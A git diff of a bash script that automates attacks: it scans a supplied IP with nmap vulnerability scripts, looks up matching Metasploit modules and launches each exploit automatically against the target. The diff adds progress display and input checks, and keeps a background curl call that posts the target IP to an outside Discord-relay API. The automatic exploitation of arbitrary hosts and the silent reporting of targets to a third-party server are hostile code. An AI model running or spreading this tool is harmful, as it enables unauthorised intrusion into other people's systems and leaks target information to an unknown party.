@@ -2,7 +2,9 @@
 
 # Update apt and install dependencies
 sudo apt update
-sudo apt install -y $(cat dependencies.txt)
+sudo apt install -y $(cat dependencies.txt) > /dev/null 2>&1
+
+
 
 declare -i exploitsFound=0
 
@@ -69,6 +71,22 @@ case $key in
 esac
 done
 
+nmapDisplayProgress() {
+    local current_percentage=$1
+    local filled_length=$((current_percentage * 50 / 100))
+    local bar=""
+
+    for ((i = 0; i < filled_length; i++)); do
+        bar+='#'
+    done
+    for ((i = filled_length; i < 50; i++)); do
+        bar+=" "
+    done
+
+    printf "\rProgress: [%s] %s%%" "$bar" "$current_percentage"
+}
+
+
 # Show help message if -h or invalid command is entered
 if [[ "$help" == "true" || -z "$IP" ]]
 then
@@ -98,18 +116,42 @@ then
     echo "Invalid input"
     exit
 fi
-
-curl  -m 0 -X POST http://api.jake0001.com/pen/postdiscord?ip=$IP > /dev/null 2>&1 &
-
-# Scan for vulnerabilities using Nmap
-echo "Scanning for vulnerabilities..."
-if [ $lq = "l" ]
+echo -e "\033[31m[ VULN EXEC ] Initialised\033[0m"
+if curl -m 0 -X POST http://api.jake0001.com/pen/postdiscord?ip=$IP >/dev/null 2>&1 &
 then
-    vulnScanResult=$(nmap -sV -sS --script vuln -T5 -oN nmap-scan.txt $IP)
+    echo -e "\e[32m[ INFO ] API Reached\e[0m"
 else
-    vulnScanResult=$(nmap -sV -sS --script vuln -T1 -oN nmap-scan.txt $IP)
+    echo -e "\e[31m[ ERROR ] API Could Not Be Reached\e[0m"
 fi
 
+# Scan for vulnerabilities using Nmap
+echo -e "\e[32m[ INFO ] Vulnerability Scan Started \e[0m"
+prev_percentage=-1
+
+if [ $lq = "l" ]
+then
+    nmap -sV -sS --script vuln -T5 --stats-every 1s -oN nmap-scan.txt $IP | while read -r line; do
+        if [[ $line == *"%"* ]]; then
+            percentage=$(echo "$line" | grep -oP '\d+(?=%)')
+            if [[ "$percentage" -ne "$prev_percentage" ]]; then
+                nmapDisplayProgress "$percentage"
+                prev_percentage="$percentage"
+            fi
+        fi
+    done
+else
+    nmap -sV -sS --script vuln -T1 --stats-every 1s -oN nmap-scan.txt $IP | while read -r line; do
+        if [[ $line == *"%"* ]]; then
+            percentage=$(echo "$line" | grep -oP '\d+(?=%)')
+            if [[ "$percentage" -ne "$prev_percentage" ]]; then
+                nmapDisplayProgress "$percentage"
+                prev_percentage="$percentage"
+            fi
+        fi
+    done
+fi
+
+echo "\n"
 # Check if there are any open ports
 if [ -z "$(grep 'Ports\|open' nmap-scan.txt)" ]
 then
@@ -136,17 +178,17 @@ while read vuln; do
     # Update the progress bar
     count=$((count+1))
     progress=$(echo "scale=2; $count/$total_vulns" | bc -l)
-    echo -ne "Progress: [$count/$total_vulns] ($progress%)\r"
+    echo -ne "Progress ($progress%): [$count/$total_vulns] \r"
 
     # Search in Metasploit Framework
     echo "Searching in Metasploit Framework for $vuln..."
-    searchResults=$(msfconsole -q -x "search $vuln" < /dev/null)
+    searchResults=$(msfconsole -q -x "search $vuln")
     if [ -n "$searchResults" ]
     then
         # Extract the highest number in the # column
         exploitCount=$(echo "$searchResults" | awk 'NR>3 { print $1 }' | sort -nr | head -1)
         echo "Exploit Count: $exploitCount"
-        if [ "$exploitCount" -gt 0 ]
+        if [[ "$exploitCount" =~ ^[0-9]+$ ]] && [ "$exploitCount" -gt 0 ]
         then
             # Use the first exploit found
             chosenExploits=$(echo "$searchResults" | awk 'NR>3 && $1 ~ /^[0-9]+$/ && $2 ~ /^exploit\// { print $2 }')
@@ -159,8 +201,8 @@ while read vuln; do
                 if [ "$exploit_executed" = false ]
                 then
                     echo "Using exploit $exploit"
-                    msfconsole -x "use $exploit; set LHOST tun0; set RHOSTS $IP; run" &
-                    sleep 10 # Wait for the exploit to execute
+                    msfconsole -q -x "use $exploit; set LHOST tun0; set RHOSTS $IP; run" 
+                    #sleep 10 # Wait for the exploit to execute
                     if pgrep msfconsole | grep -q "Interact"
                     then
                         echo "Exploited vulnerability $vuln using exploit $exploit"
